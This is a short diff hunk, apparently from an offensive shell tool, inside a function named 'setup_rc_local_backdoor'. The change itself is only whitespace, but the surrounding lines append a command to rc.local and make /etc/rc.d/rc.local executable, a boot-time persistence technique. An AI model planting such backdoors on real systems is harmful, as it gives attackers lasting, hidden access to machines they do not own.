@@ -104,7 +104,7 @@ setup_rc_local_backdoor() {
 			echo "$command" >> $rc_local_path
 		fi
 	fi
-	
+
 	if [ -f /etc/rc.d/rc.local ]; then
 		chmod +x /etc/rc.d/rc.local
 	fi
